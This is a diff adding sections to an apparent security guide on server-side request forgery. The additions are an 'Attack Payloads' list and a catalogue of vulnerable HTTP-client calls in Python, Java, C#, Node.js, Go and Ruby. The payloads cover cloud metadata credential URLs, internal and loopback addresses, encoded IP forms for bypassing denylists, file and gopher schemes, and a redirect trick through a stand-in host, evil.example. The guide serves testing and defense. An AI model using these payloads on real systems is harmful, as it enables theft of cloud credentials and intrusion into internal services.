@@ -30,6 +30,112 @@ The unsafe assumption is that restricting the UI is enough and that "internal" h
 | **Redirect handling** | `follow_redirects=True` without re-validation after each hop |
 | **Async replay** | Webhooks stored in the database and fetched later by background workers |
 
+## Attack Payloads
+
+Use these in authorized tests when a parameter supplies a URL, host, or path segment to an outbound HTTP client. Replace `TARGET` with the vulnerable field.
+
+### Pattern 1: Cloud metadata (link-local)
+
+```text
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://100.100.100.200/latest/meta-data/   # Alibaba
+```
+
+### Pattern 2: Loopback and internal services
+
+```text
+http://127.0.0.1:6379/
+http://localhost:8080/admin
+http://127.0.0.1:9200/_cat/indices
+```
+
+### Pattern 3: Private RFC1918 ranges
+
+```text
+http://10.0.0.15/internal/users
+http://192.168.1.1/
+http://172.16.0.5:8500/v1/agent/self
+```
+
+### Pattern 4: Encoded and alternate IP forms (bypass denylists)
+
+```text
+http://2130706433/          # decimal 127.0.0.1
+http://0x7f000001/
+http://127.1/
+http://[::1]/
+http://0177.0.0.1/
+```
+
+### Pattern 5: Non-HTTP schemes and redirects
+
+```text
+file:///etc/passwd
+gopher://127.0.0.1:6379/_...
+# Register https://evil.example → 302 to http://169.254.169.254/
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Any outbound request built from user input needs allowlisting, DNS rebinding awareness, and post-redirect re-validation.
+
+### Python
+
+```python
+import requests, urllib.request
+requests.get(user_url, allow_redirects=True)
+urllib.request.urlopen(attacker_url)
+httpx.AsyncClient().get(url_from_body)
+```
+
+Also: `aiohttp`, `selenium`/`playwright` navigation to user URLs, PDF renderers fetching remote HTML.
+
+### Java
+
+```java
+new URL(userUrl).openConnection();
+HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(url)).build(), ...);
+RestTemplate.getForObject(endpoint, String.class);
+```
+
+Apache HttpClient, `URLConnection`, image/PDF libraries that fetch remote resources.
+
+### C#
+
+```csharp
+await httpClient.GetAsync(userUrl);
+new WebClient().DownloadString(url);
+```
+
+`HttpWebRequest`, WCF clients, headless browser automation with user-supplied start URL.
+
+### JavaScript (Node.js)
+
+```javascript
+const axios = require('axios');
+await axios.get(req.query.url);
+await fetch(userUrl);
+```
+
+`node-fetch`, `got`, `request`, server-side `puppeteer.goto(url)`.
+
+### Go
+
+```go
+http.Get(userURL)
+client.Do(req) // req.URL from JSON body
+```
+
+`net/http`, custom TCP dialers, gRPC gateways that proxy to user hostnames.
+
+### Ruby
+
+```ruby
+URI.open(params[:url])
+Net::HTTP.get(URI(user_url))
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
